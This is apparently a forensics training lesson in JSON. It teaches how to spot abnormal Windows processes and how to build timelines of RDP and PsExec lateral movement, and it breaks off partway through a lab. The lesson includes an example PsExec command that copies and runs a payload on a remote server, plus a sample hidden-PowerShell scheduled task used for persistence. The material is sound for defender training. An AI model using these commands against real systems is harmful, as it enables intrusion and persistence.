{
  "lesson_id": "d1f6e5b4-2c7e-4d8f-e1a0-4b5c6d7e8f9a",
  "domain": "dfir",
  "title": "Forensic Timeline Investigation with SANS Hunt Evil",
  "difficulty": 2,
  "order_index": 8,
  "prerequisites": [
    "dfir-001-fundamentals"
  ],
  "concepts": [
    "Windows Process Baseline Analysis",
    "Normal vs Abnormal Process Behavior",
    "Lateral Movement Detection",
    "Remote Execution Artifacts",
    "Timeline Analysis Methodology",
    "Evidence of Program Execution",
    "Forensic Artifact Correlation"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Identify normal Windows processes and detect anomalies using baseline knowledge",
    "Understand lateral movement techniques and associated forensic artifacts",
    "Correlate evidence across Event Logs, Registry, and File System sources",
    "Build forensic timelines from multiple artifact sources",
    "Detect remote access and execution techniques (RDP, PsExec, WMI, PowerShell Remoting)",
    "Apply the SANS Hunt Evil methodology to real-world incident response scenarios"
  ],
  "post_assessment": [
    {
      "question": "You discover a process named 'svchost.exe' running with parent process 'explorer.exe'. Why is this suspicious?",
      "options": [
        "svchost.exe should always run with parent process services.exe, not explorer.exe",
        "svchost.exe cannot run under Local System account",
        "svchost.exe should only run from C:\\Windows\\System32, location doesn't matter for parent",
        "This is normal behavior when users manually start services"
      ],
      "correct_answer": 0,
      "difficulty": 2,
      "type": "multiple_choice",
      "question_id": "679c4d98-75c8-489a-be11-eeb55ac4dcc4",
      "explanation": "Explanation not provided."
    },
    {
      "question": "During timeline analysis, you find Event ID 4648 (logon with alternate credentials) followed by Event ID 5140 (share access to ADMIN$) and Event ID 7045 (service installed). What lateral movement technique does this indicate?",
      "options": [
        "Remote Desktop Protocol (RDP) session",
        "PsExec remote execution",
        "PowerShell Remoting (WinRM)",
        "WMI/WMIC remote command execution"
      ],
      "correct_answer": 1,
      "difficulty": 3,
      "type": "multiple_choice",
      "question_id": "ee40c3d1-e9c9-4953-8799-96e19262b31f",
      "explanation": "Explanation not provided."
    },
    {
      "question": "You're investigating a compromised system and find 'psexesvc.exe' in C:\\Windows with a creation time of 2024-12-20 14:30:15. Where should you look NEXT to identify the source of this lateral movement?",
      "options": [
        "Check Security Event Log for Event ID 4624 (Logon Type 3) around 14:30 to identify source IP",
        "Check System Event Log for Event ID 7045 (service install) to find who installed it",
        "Check Prefetch for psexesvc.exe execution count",
        "All of the above - correlate multiple artifact sources for complete timeline"
      ],
      "correct_answer": 3,
      "difficulty": 3,
      "type": "multiple_choice",
      "question_id": "2fa0ab35-4877-4d46-ab0d-aa16ba6040bb",
      "explanation": "Explanation not provided."
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Forensic Timeline Investigation: Hunt Evil - Know Normal\n\n**Imagine this scenario**:\n\nYou're called to investigate a suspected breach. The security team detected suspicious network traffic, but they don't know:\n- **When** did the attacker first compromise the system?\n- **What** did they do once inside?\n- **How** did they move laterally to other systems?\n- **Where** is the evidence that proves this happened?\n\n**This is where forensic timeline analysis comes in.**\n\nBy correlating artifacts from Event Logs, Registry, and the File System, you can reconstruct the **complete story** of what happened during an incident.\n\n## The SANS Hunt Evil Philosophy: \"Find Evil - Know Normal\"\n\n**The core principle**: You can't detect abnormal activity unless you first understand what's normal.\n\n**Key insight from the SANS Hunt Evil poster**:\n\n> \"Knowing what's normal on a Windows host helps cut through the noise to quickly locate potential malware. Use the information below as a reference to know what's normal in Windows and to focus your attention on the outliers.\"\n\n### What Does \"Know Normal\" Mean?\n\n**Normal Windows Process Behavior**:\n\n```\n┌────────────────────────────────────────────────────────────────┐\n│  NORMAL WINDOWS PROCESS BASELINE (System Processes)           │\n└────────────────────────────────────────────────────────────────┘\n\nProcess: system.exe\n├─ Image Path: N/A (kernel-mode, not from executable image)\n├─ Parent Process: None\n├─ Number of Instances: One\n├─ User Account: Local System\n├─ Start Time: At boot time\n└─ Description: Kernel-mode threads, drivers (.sys), ntoskrnl.exe\n\nProcess: smss.exe (Session Manager)\n├─ Image Path: C:\\Windows\\System32\\smss.exe\n├─ Parent Process: System\n├─ Number of Instances: One master + child per session (exits after)\n├─ User Account: Local System\n├─ Start Time: Within seconds of boot\n└─ Description: Creates new sessions, starts csrss.exe and wininit.exe\n\nProcess: csrss.exe (Client/Server Runtime Subsystem)\n├─ Image Path: C:\\Windows\\System32\\csrss.exe\n├─ Parent Process: smss.exe (exits, appears orphaned)\n├─ Number of Instances: Two or more (one per session)\n├─ User Account: Local System\n├─ Start Time: Within seconds of boot (Session 0 and 1)\n└─ Description: User-mode Windows subsystem, manages processes/threads\n\nProcess: wininit.exe\n├─ Image Path: C:\\Windows\\System32\\wininit.exe\n├─ Parent Process: smss.exe (exits, appears orphaned)\n├─ Number of Instances: One\n├─ User Account: Local System\n├─ Start Time: Within seconds of boot\n└─ Description: Starts services.exe, lsass.exe, lsaiso.exe (Session 0)\n\nProcess: services.exe (Service Control Manager)\n├─ Image Path: C:\\Windows\\System32\\services.exe\n├─ Parent Process: wininit.exe\n├─ Number of Instances: One\n├─ User Account: Local System\n├─ Start Time: Within seconds of boot\n└─ Description: Loads services and device drivers marked for auto-start\n\nProcess: svchost.exe (Generic Service Host)\n├─ Image Path: C:\\Windows\\System32\\svchost.exe\n├─ Parent Process: services.exe (MOST OFTEN - this is key!)\n├─ Number of Instances: Many (10-50+)\n├─ User Account: Local System, Network Service, Local Service, or per-user\n├─ Start Time: Close to boot time (but can start later)\n└─ Description: Hosts service DLLs, uses -k (Service Host Groups) and -s (service name)\nExample: svchost.exe -k netsvcs -s LanmanServer\n\nProcess: lsass.exe (Local Security Authority Subsystem)\n├─ Image Path: C:\\Windows\\System32\\lsass.exe\n├─ Parent Process: wininit.exe\n├─ Number of Instances: One (ONLY ONE!)\n├─ User Account: Local System\n├─ Start Time: Within seconds of boot\n└─ Description: Authenticates users (Kerberos/MSV1_0), enforces security policies\n⚠️ Rarely has child processes (except EFS)\n⚠️ Attackers target this for credential dumping (Mimikatz)\n\nProcess: winlogon.exe\n├─ Image Path: C:\\Windows\\System32\\winlogon.exe\n├─ Parent Process: smss.exe (exits, appears orphaned)\n├─ Number of Instances: One or more (one per session)\n├─ User Account: Local System\n├─ Start Time: Within seconds of boot (Session 1), or on new RDP sessions\n└─ Description: Handles interactive logons, launches LogonUI.exe, loads user shell\nCommon children: dwm.exe (Desktop Window Manager), fontdrvhost.exe\n\nProcess: explorer.exe (Windows Explorer)\n├─ Image Path: C:\\Windows\\explorer.exe (NOT System32!)\n├─ Parent Process: userinit.exe (exits, appears orphaned)\n├─ Number of Instances: One or more per logged-on user\n├─ User Account: Logged-on user(s)\n├─ Start Time: When user's interactive logon begins\n└─ Description: File browser + UI (Desktop, Start Menu, Taskbar)\n⚠️ Parent of many user applications\n⚠️ Attackers abuse this to launch malware (looks like user activity)\n```\n\n**Why this matters for incident response**:\n\n**Scenario 1: Detecting Malicious svchost.exe**\n\n**You see this in Process Explorer**:\n```\nProcess: svchost.exe\nParent: explorer.exe\nPath: C:\\Users\\Public\\svchost.exe\nUser: jdoe\n```\n\n**Red flags**:\n1. ❌ **Parent is explorer.exe** (should be services.exe)\n2. ❌ **Path is C:\\Users\\Public** (should be C:\\Windows\\System32)\n3. ❌ **User is jdoe** (should be SYSTEM, Network Service, or Local Service)\n\n**Verdict**: This is **malware masquerading as svchost.exe**.\n\n**Scenario 2: Detecting Fake lsass.exe**\n\n**You see this in Process Explorer**:\n```\nProcess: lsass.exe\nParent: services.exe\nPath: C:\\Windows\\System32\\lsass.exe\nUser: Local System\n```\n\nAND\n\n```\nProcess: lsass.exe\nParent: svchost.exe\nPath: C:\\Windows\\Temp\\lsass.exe\nUser: jdoe\n```\n\n**Analysis**:\n- **First lsass.exe**: ✅ Normal (parent wininit.exe usually, but could appear as orphan)\n- **Second lsass.exe**: ❌ **Fake** (wrong parent, wrong path, wrong user)\n\n**Verdict**: Two instances of lsass.exe running = **malware** (only one legitimate lsass.exe should exist).\n\n## Forensic Timeline Methodology\n\n**Timeline analysis** reconstructs events chronologically by correlating artifacts from multiple sources.\n\n### The Three Pillars of Forensic Evidence\n\n```\n┌────────────────────────────────────────────────────────────────┐\n│  FORENSIC EVIDENCE SOURCES (The Three Pillars)                │\n└────────────────────────────────────────────────────────────────┘\n\n1. EVENT LOGS (What happened, when, and by whom?)\n├─ Security.evtx (authentication, access, policy changes)\n├─ System.evtx (services, drivers, boot events)\n├─ Application.evtx (application errors, crashes)\n├─ Microsoft-Windows-Sysmon/Operational.evtx (process, network, file, registry)\n├─ Microsoft-Windows-TerminalServices-*.evtx (RDP activity)\n├─ Microsoft-Windows-PowerShell/Operational.evtx (PS script execution)\n└─ Microsoft-Windows-WinRM/Operational.evtx (PowerShell Remoting)\n\n2. REGISTRY (Configuration, settings, historical execution)\n├─ SYSTEM hive (services, boot config, ShimCache)\n├─ SOFTWARE hive (installed apps, scheduled tasks)\n├─ NTUSER.DAT (per-user settings, UserAssist, RecentDocs, MRU lists)\n├─ UsrClass.dat (ShellBags, file associations)\n└─ AmCache.hve (program execution, SHA1 hashes, first run times)\n\n3. FILE SYSTEM (Artifacts of execution, file creation, timestamps)\n├─ Prefetch (C:\\Windows\\Prefetch\\*.pf) - last 8 execution times\n├─ Scheduled Tasks (C:\\Windows\\System32\\Tasks\\*.xml)\n├─ Jump Lists (AppData\\Roaming\\Microsoft\\Windows\\Recent\\)\n├─ LNK files (shortcuts - targets, timestamps, volume serial numbers)\n├─ User Access Logging (C:\\Windows\\System32\\LogFiles\\Sum\\) - Server only\n└─ SRUM (System Resource Usage Monitor) - C:\\Windows\\System32\\SRU\\SRUDB.dat\n```\n\n**Timeline Correlation Example**:\n\n**Question**: When did the attacker first execute malware on this system?\n\n**Evidence from multiple sources**:\n\n```\n┌────────────────────────────────────────────────────────────────┐\n│  CORRELATED TIMELINE: Malware Execution (evil.exe)            │\n└────────────────────────────────────────────────────────────────┘\n\nTimestamp          | Source           | Artifact                    | Evidence\n───────────────────┼──────────────────┼─────────────────────────────┼─────────────────────────\n2024-12-20 14:25:30│ File System      │ evil.exe created            │ C:\\Users\\Public\\evil.exe\n│                  │ (NTFS $SI Created)          │ Created time\n───────────────────┼──────────────────┼─────────────────────────────┼─────────────────────────\n2024-12-20 14:27:45│ Registry         │ ShimCache (SYSTEM)          │ evil.exe path + last modified\n│                  │                             │ Indicates file existed\n───────────────────┼──────────────────┼─────────────────────────────┼─────────────────────────\n2024-12-20 14:28:10│ File System      │ Prefetch created            │ evil.exe-A1B2C3D4.pf\n│                  │                             │ FIRST execution time\n───────────────────┼──────────────────┼─────────────────────────────┼─────────────────────────\n2024-12-20 14:28:12│ Event Log        │ Sysmon Event ID 1           │ Process Create: evil.exe\n│                  │                             │ Parent: explorer.exe\n│                  │                             │ User: jdoe\n│                  │                             │ CommandLine: C:\\Users\\Public\\evil.exe\n───────────────────┼──────────────────┼─────────────────────────────┼─────────────────────────\n2024-12-20 14:28:15│ Event Log        │ Sysmon Event ID 3           │ Network Connection\n│                  │                             │ Process: evil.exe\n│                  │                             │ Dest IP: 185.141.63.120:443\n───────────────────┼──────────────────┼─────────────────────────────┼─────────────────────────\n2024-12-20 14:28:20│ Registry         │ AmCache.hve                 │ evil.exe SHA1 hash\n│                  │                             │ First execution: 14:28:10\n───────────────────┼──────────────────┼─────────────────────────────┼─────────────────────────\n2024-12-20 14:28:22│ Registry         │ BAM/DAM (SYSTEM)            │ evil.exe last execution\n│                  │                             │ User SID: S-1-5-21-...\n```\n\n**Timeline Analysis**:\n1. **14:25:30**: File created (attacker downloads/copies evil.exe)\n2. **14:27:45**: ShimCache records file existence (Windows compatibility check)\n3. **14:28:10**: Prefetch created = **FIRST EXECUTION** (10 seconds before Sysmon logs it)\n4. **14:28:12**: Sysmon confirms execution (parent explorer.exe = user double-clicked)\n5. **14:28:15**: evil.exe beacons to C2 server (185.141.63.120:443)\n6. **14:28:20**: AmCache records execution and SHA1 hash\n7. **14:28:22**: BAM/DAM records last execution time\n\n**Key findings**:\n- **Initial compromise**: 2024-12-20 14:25:30 (file creation)\n- **First execution**: 2024-12-20 14:28:10 (Prefetch creation)\n- **C2 communication**: 2024-12-20 14:28:15 (network connection)\n- **User responsible**: jdoe (Sysmon, BAM/DAM)\n- **Malware hash**: [SHA1 from AmCache] (for threat intelligence lookup)\n\n**This is the power of timeline correlation**: No single artifact tells the complete story, but together they reconstruct the full attack."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Lateral Movement Detection: Remote Access and Execution\n\n**Lateral movement** is when attackers move from one compromised system to another within a network.\n\n**Why lateral movement is critical to detect**:\n- Initial compromise is often a **low-value target** (user workstation)\n- Attackers need to move **laterally** to reach **high-value targets** (servers, domain controllers, databases)\n- Detecting lateral movement = **stopping attackers before they reach crown jewels**\n\n### Remote Desktop Protocol (RDP) - The Most Common Lateral Movement Technique\n\n**RDP** allows interactive remote access to Windows systems.\n\n**Attacker use case**: Use stolen credentials to RDP from compromised workstation to target server.\n\n#### **SOURCE System Artifacts** (Attacker's System)\n\n**Event Logs**:\n```\nSecurity.evtx:\n└─ Event ID 4648: Logon specifying alternate credentials (if NLA enabled)\n├─ Current User: attacker-user\n├─ Alternate User: admin-account\n└─ Destination: target-server.corp.local\n\nMicrosoft-Windows-TerminalServices-RDPClient%4Operational.evtx:\n├─ Event ID 1024: Destination Host Name\n└─ Event ID 1102: Destination IP Address\n```\n\n**Registry**:\n```\nNTUSER.DAT\\Software\\Microsoft\\Terminal Server Client\\Servers\\\n└─ Tracks RDP connection destinations (per user)\nExample: target-server.corp.local\nUsernameHint: admin-account\n```\n\n**File System**:\n```\nC:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\\n└─ {MSTSC-APPID}-automaticDestinations-ms\nTracks remote desktop destinations and connection times\n\nC:\\Windows\\Prefetch\\\n└─ mstsc.exe-{hash}.pf\nExecution count and last 8 execution times\n\nC:\\Users\\<Username>\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\\n├─ bcache##.bmc\n└─ cache####.bin\nBitmap cache of remote desktop session (can recover screenshots!)\n\nC:\\Users\\<Username>\\Documents\\\n└─ Default.rdp\nRDP connection settings\n```bash\n\n#### **DESTINATION System Artifacts** (Target Server)\n\n**Event Logs**:\n```\nSecurity.evtx:\n├─ Event ID 4624: Logon Type 10 (RemoteInteractive)\n│  ├─ Source IP: 10.0.2.50\n│  └─ Logon User: admin-account\n│\n└─ Event ID 4778/4779: Session Connected/Disconnected\n├─ Source IP Address\n└─ Logon User Name\n\nMicrosoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx:\n├─ Event ID 131: Connection Attempts (Source IP)\n└─ Event ID 98: Successful Connections\n\nMicrosoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx:\n└─ Event ID 1149: Successful logon (Source IP + User)\n⚠️ Blank user name may indicate Sticky Keys attack\n\nMicrosoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx:\n├─ Event ID 21, 22, 25: Session logon/logoff (Source IP + User)\n└─ Event ID 41: Logon User Name\n```\n\n**File System**:\n```\nC:\\Windows\\Prefetch\\\n├─ rdpclip.exe-{hash}.pf (RDP clipboard process - indicates RDP session)\n└─ tstheme.exe-{hash}.pf (Terminal Services theme - indicates RDP session)\n```\n\n**Registry**:\n```\nSYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\nShimCache: rdpclip.exe, tstheme.exe\n\nAmCache.hve:\nrdpclip.exe first execution time\ntstheme.exe first execution time\n```\n\n**Timeline Example: RDP Lateral Movement**\n\n```\n┌────────────────────────────────────────────────────────────────────────────┐\n│  RDP LATERAL MOVEMENT TIMELINE                                             │\n└────────────────────────────────────────────────────────────────────────────┘\n\nSOURCE: Workstation (WKS-042, IP: 10.0.2.50)\nDESTINATION: Server (SRV-FILE01, IP: 10.0.1.30)\nATTACKER: jdoe (compromised user account)\nSTOLEN CREDENTIALS: corp\\admin-account\n\n─────────────────────────────────────────────────────────────────────────────\nTIMESTAMP          │ SYSTEM  │ SOURCE         │ ARTIFACT\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 15:30:15│ WKS-042 │ Security.evtx  │ Event ID 4648: Alternate creds\n│         │                │   User: jdoe\n│         │                │   Alternate: admin-account\n│         │                │   Dest: SRV-FILE01\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 15:30:18│ WKS-042 │ RDPClient.evtx │ Event ID 1024: Dest Host\n│         │                │   SRV-FILE01.corp.local\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 15:30:20│ WKS-042 │ Prefetch       │ mstsc.exe-{hash}.pf\n│         │                │   Execution count: 5\n│         │                │   Last run: 15:30:18\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 15:30:22│ SRV-FILE│ Security.evtx  │ Event ID 4624: Logon Type 10\n│         │                │   Source IP: 10.0.2.50\n│         │                │   User: admin-account\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 15:30:22│ SRV-FILE│ RdpCoreTS.evtx │ Event ID 131: Connection attempt\n│         │                │   Source IP: 10.0.2.50\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 15:30:25│ SRV-FILE│ RemoteConn.evtx│ Event ID 1149: Successful logon\n│         │                │   Source IP: 10.0.2.50\n│         │                │   User: admin-account\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 15:30:28│ SRV-FILE│ Prefetch       │ rdpclip.exe-{hash}.pf created\n│         │                │   (RDP session active)\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 15:35:40│ SRV-FILE│ Security.evtx  │ Event ID 4779: Session disconnect\n│         │                │   User: admin-account\n─────────────────────────────────────────────────────────────────────────────\n```\n\n**Key findings**:\n- **Compromised system**: WKS-042 (10.0.2.50)\n- **Compromised account**: jdoe (used stolen admin-account credentials)\n- **Target system**: SRV-FILE01 (10.0.1.30)\n- **Lateral movement technique**: RDP (Remote Desktop Protocol)\n- **Session duration**: 5 minutes 18 seconds (15:30:22 - 15:35:40)\n- **Evidence sources**: 8 artifacts across source and destination systems\n\n### PsExec - Remote Execution via Service Installation\n\n**PsExec** (Sysinternals tool) allows remote command execution by installing a temporary service.\n\n**Attacker use case**: Execute malware remotely without interactive RDP session.\n\n**Command**: `psexec.exe \\\\target-server -accepteula -d -c C:\\temp\\evil.exe`\n\n#### **SOURCE System Artifacts**\n\n**Registry**:\n```\nNTUSER.DAT\\Software\\Sysinternals\\PsExec\\EulaAccepted\n└─ Indicates PsExec was run by this user (EULA accepted)\n```\n\n**File System**:\n```\nC:\\Windows\\Prefetch\\\n└─ psexec.exe-{hash}.pf\n├─ Execution count\n├─ Last 8 execution times\n└─ Files accessed (may include evil.exe if copied with -c option)\n\nC:\\temp\\\n└─ evil.exe (if attacker staged payload locally)\n```\n\n**Event Logs**:\n```\nSecurity.evtx:\n├─ Event ID 4648: Logon with alternate credentials\n│  ├─ Current User: attacker-user\n│  ├─ Process: psexec.exe\n│  └─ Destination: target-server\n│\n└─ Event ID 4624: Logon Type 3 (Network logon to target)\n```bash\n\n#### **DESTINATION System Artifacts**\n\n**Event Logs**:\n```\nSecurity.evtx:\n├─ Event ID 4624: Logon Type 3 (Network logon)\n│  └─ Source IP: 10.0.2.50\n│\n├─ Event ID 4624: Logon Type 2 (if -u option used for alternate credentials)\n│\n├─ Event ID 4672: Special privileges assigned\n│  └─ Administrative logon required for PsExec\n│\n└─ Event ID 5140: Share Access (ADMIN$ share used by PsExec)\n\nSystem.evtx:\n└─ Event ID 7045: Service Install\n├─ Service Name: PSEXESVC (default) or custom if -r option used\n├─ Service File: C:\\Windows\\psexesvc.exe\n└─ Service Type: User Mode Service\n```\n\n**File System**:\n```\nC:\\Windows\\\n├─ psexesvc.exe (PsExec service executable placed in ADMIN$ share)\n└─ evil.exe (if attacker copied payload with -c option)\n\nC:\\Windows\\Prefetch\\\n├─ psexesvc.exe-{hash}.pf (PsExec service execution)\n└─ evil.exe-{hash}.pf (Malware execution)\n\nC:\\Users\\\n└─ User profile directory created (unless -e option used to prevent)\n\nC:\\Windows\\System32\\LogFiles\\Sum\\ (Server only - User Access Logging)\n└─ Current.mdb\n├─ User Name\n├─ Source IP: 10.0.2.50\n└─ First and Last Access Times\n```\n\n**Registry**:\n```\nSYSTEM\\CurrentControlSet\\Services\\PSEXESVC\\\n└─ Service configuration\n├─ ImagePath: C:\\Windows\\psexesvc.exe\n├─ Start: 3 (Manual)\n└─ Type: 16 (Own Process)\nNote: Attacker may use -r option to rename service for evasion\n\nSYSTEM (ShimCache):\n├─ psexesvc.exe\n└─ evil.exe\n\nAmCache.hve:\n├─ psexesvc.exe (first execution time, SHA1 hash)\n└─ evil.exe (first execution time, SHA1 hash)\n```\n\n**PsExec Detection Timeline**:\n\n```\n┌────────────────────────────────────────────────────────────────────────────┐\n│  PSEXEC REMOTE EXECUTION TIMELINE                                          │\n└────────────────────────────────────────────────────────────────────────────┘\n\nSOURCE: WKS-042 (10.0.2.50)\nDESTINATION: SRV-DB01 (10.0.1.40)\nCOMMAND: psexec.exe \\\\SRV-DB01 -accepteula -d -c C:\\temp\\evil.exe\n\n─────────────────────────────────────────────────────────────────────────────\nTIMESTAMP          │ SYSTEM  │ SOURCE         │ ARTIFACT\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 16:15:10│ WKS-042 │ Security.evtx  │ Event ID 4648: Alternate creds\n│         │                │   Process: psexec.exe\n│         │                │   Dest: SRV-DB01\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 16:15:12│ SRV-DB01│ Security.evtx  │ Event ID 4624: Logon Type 3\n│         │                │   Source IP: 10.0.2.50\n│         │                │   User: admin-account\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 16:15:12│ SRV-DB01│ Security.evtx  │ Event ID 4672: Admin privs\n│         │                │   User: admin-account\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 16:15:13│ SRV-DB01│ Security.evtx  │ Event ID 5140: Share Access\n│         │                │   Share: \\\\*\\ADMIN$\n│         │                │   Source IP: 10.0.2.50\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 16:15:15│ SRV-DB01│ File System    │ psexesvc.exe created\n│         │                │   C:\\Windows\\psexesvc.exe\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 16:15:15│ SRV-DB01│ File System    │ evil.exe copied (-c option)\n│         │                │   C:\\Windows\\evil.exe\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 16:15:16│ SRV-DB01│ System.evtx    │ Event ID 7045: Service Install\n│         │                │   Service: PSEXESVC\n│         │                │   Path: C:\\Windows\\psexesvc.exe\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 16:15:18│ SRV-DB01│ Prefetch       │ psexesvc.exe-{hash}.pf\n│         │                │   First execution\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 16:15:20│ SRV-DB01│ Prefetch       │ evil.exe-{hash}.pf\n│         │                │   Executed by psexesvc.exe\n─────────────────────────────────────────────────────────────────────────────\n2024-12-20 16:15:22│ SRV-DB01│ Sysmon (if ena)│ Event ID 1: Process Create\n│         │                │   Process: evil.exe\n│         │                │   Parent: psexesvc.exe\n│         │                │   User: SYSTEM\n─────────────────────────────────────────────────────────────────────────────\n```\n\n**PsExec Detection Indicators**:\n1. ✅ Event ID 4648 on source (alternate credentials)\n2. ✅ Event ID 5140 on dest (ADMIN$ share access)\n3. ✅ Event ID 7045 on dest (service install)\n4. ✅ psexesvc.exe in C:\\Windows\n5. ✅ Registry: SYSTEM\\CurrentControlSet\\Services\\PSEXESVC\n6. ✅ Prefetch: psexesvc.exe-{hash}.pf\n\n**Hunting query for PsExec activity**:\n\n```sql\n-- Hunt for PsExec service installations across environment\nSELECT \nTimeGenerated,\nComputer,\nEventID,\nServiceName,\nServiceFileName\nFROM \nSystemEventLog\nWHERE \nEventID = 7045\nAND (ServiceName LIKE '%PSEXE%' OR ServiceFileName LIKE '%psexesvc%')\nORDER BY \nTimeGenerated DESC;\n```"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-On Lab: Build a Forensic Timeline from Multiple Artifacts\n\nLet's investigate a real-world lateral movement scenario using artifacts from the SANS Hunt Evil poster.\n\n### Lab Scenario\n\n**Incident**: Your SOC detected suspicious network traffic from server SRV-WEB02 (10.0.1.25) to an external IP (203.0.113.50) on port 443. You're tasked with:\n1. Determining how the attacker accessed SRV-WEB02\n2. Building a timeline of attacker activity\n3. Identifying what the attacker did on the system\n\n**Available Evidence**:\n- Windows Event Logs (Security.evtx, System.evtx, PowerShell logs)\n- Registry hives (SYSTEM, SOFTWARE, NTUSER.DAT, AmCache.hve)\n- File system artifacts (Prefetch, scheduled tasks, user files)\n\n---\n\n### Step 1: Hunt for Remote Access (RDP, PsExec, WinRM)\n\n**Start with authentication events** to identify how the attacker gained access.\n\n```powershell\n# Hunt for remote logons (Logon Type 3, 10) in Security Event Log\nGet-WinEvent -FilterHashtable @{\nLogName='Security'\nID=4624\nStartTime=(Get-Date).AddDays(-7)\n} | Where-Object {\n$xml = [xml]$_.ToXml()\n$logonType = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonType'} | Select-Object -ExpandProperty '#text'\n$sourceIP = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'\n\n# Logon Type 3 (Network) or Type 10 (RemoteInteractive/RDP)\n($logonType -eq '3' -or $logonType -eq '10') -and\n$sourceIP -ne '-' -and $sourceIP -ne '127.0.0.1'\n} | Select-Object TimeCreated, @{N='LogonType'; E={\n$xml = [xml]$_.ToXml()\n$xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonType'} | Select-Object -ExpandProperty '#text'\n}}, @{N='User'; E={\n$xml = [xml]$_.ToXml()\n$xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'\n}}, @{N='SourceIP'; E={\n$xml = [xml]$_.ToXml()\n$xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'\n}} | Format-Table -AutoSize\n```\n\n**Expected Output**:\n```\nTimeCreated          LogonType User          SourceIP\n-----------          --------- ----          --------\n12/20/2024 3:45:22 PM    3     svc-backup    10.0.2.15\n12/20/2024 4:12:08 PM    10    admin-account 10.0.2.50\n12/20/2024 4:15:30 PM    3     admin-account 10.0.2.50\n```\n\n**Analysis**:\n- **3:45 PM**: Normal service account activity (svc-backup)\n- **4:12 PM**: RDP session (Logon Type 10) from 10.0.2.50 using admin-account ⚠️\n- **4:15 PM**: Network logon (Type 3) from same IP/account (possibly PsExec or WMI)\n\n---\n\n### Step 2: Correlate with RDP-Specific Event Logs\n\n```powershell\n# Check RDP connection logs\nGet-WinEvent -FilterHashtable @{\nLogName='Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational'\nID=1149\nStartTime=(Get-Date).AddDays(-1)\n} | Select-Object TimeCreated, Message | Format-List\n\n# Output:\n# TimeCreated: 12/20/2024 4:12:10 PM\n# Message: User authentication succeeded.\n#          User: admin-account\n#          Domain: CORP\n#          Source Network Address: 10.0.2.50\n```\n\n**Confirmed**: RDP session from 10.0.2.50 by admin-account at 4:12 PM.\n\n---\n\n### Step 3: Identify Post-Exploitation Activity\n\n**Check for scheduled task creation** (common persistence technique):\n\n```powershell\n# Hunt for scheduled task creation\nGet-WinEvent -FilterHashtable @{\nLogName='Microsoft-Windows-TaskScheduler/Operational'\nID=106  # Task registered\nStartTime=(Get-Date).AddDays(-1)\n} | Where-Object {\n$_.Message -match 'powershell' -or \n$_.Message -match 'cmd.exe' -or\n$_.Message -match 'wscript' -or\n$_.Message -match 'mshta'\n} | Select-Object TimeCreated, Message | Format-List\n\n# Output:\n# TimeCreated: 12/20/2024 4:18:35 PM\n# Message: Task Scheduler registered task \"\\Microsoft\\Windows\\UpdateChecker\"\n#          Task Action: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n#          -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass\n#          -File C:\\ProgramData\\update.ps1\n```\n\n**⚠️ Suspicious**: \n- Scheduled task created during attacker's RDP session\n- Task name mimics legitimate Windows tasks (\"UpdateChecker\")\n- PowerShell with evasion flags (NoProfile, Hidden, Bypass)\n- Executes script from suspicious location (C:\\ProgramData\\update.ps1)\n\n---\n\n### Step 4: Examine Scheduled Task XML (File System Artifact)\n\n```powershell\n# Read task XML to get full details\n[xml]$taskXml = Get-Content \"C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateChecker\"\n\n# Extract key metadata\n$taskXml.Task.RegistrationInfo.Author\n$taskXml.Task.Actions.Exec.Command\n$taskXml.Task.Actions.Exec.Arguments\n$taskXml.Task.Triggers\n```\n\n**Output**:\n```xml\n<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n<RegistrationInfo>\n<Author>WKS-042\\admin-account</Author>\n<Date>2024-12-20T16:18:35</Date>\n</RegistrationInfo>\n<Triggers>\n<TimeTrigger>\n<StartBoundary>2024-12-20T17:00:00</StartBoundary>\n<Enabled>true</Enabled>\n<ExecutionTimeLimit>PT1H</ExecutionTimeLimit>\n<Repetition>\n<Interval>PT1H</Interval>\n</Repetition>\n</TimeTrigger>\n</Triggers>\n<Actions>\n<Exec>\n<Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command>\n<Arguments>-NoProfile -WindowStyle Hidden 